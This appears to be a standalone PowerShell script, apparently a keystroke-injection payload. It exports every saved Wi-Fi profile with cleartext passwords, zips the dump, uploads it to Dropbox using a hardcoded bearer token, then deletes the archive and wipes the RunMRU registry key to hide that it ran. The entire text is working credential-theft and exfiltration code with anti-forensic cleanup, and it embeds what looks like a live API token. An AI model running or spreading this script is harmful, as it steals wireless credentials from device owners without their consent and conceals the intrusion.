mkdir $env:Temp\Netwerk
netsh wlan export profile key=clear folder=$env:Temp\Netwerk
Compress-Archive -Path $env:Temp\Netwerk\* -CompressionLevel NoCompression -DestinationPath $env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip
$TargetFilePath="/$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
$SourceFilePath="$env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + "sl.Bpdw-Gu_yNbGq8LCTiCHxwhl-8-NPnb1wo8EVhEy8F6GAZcl3gjxmO_CvD" + "jFgWPg3Wk6C68ovFO0yjPFFpyNR319yDrkQzJGqe_9FTCng-D__PSYNknSPkhUPnT4KNScRePfOoXQCxA53sg"
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
rm $SourceFilePath
$RegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Remove-Item -Path $RegistryPath
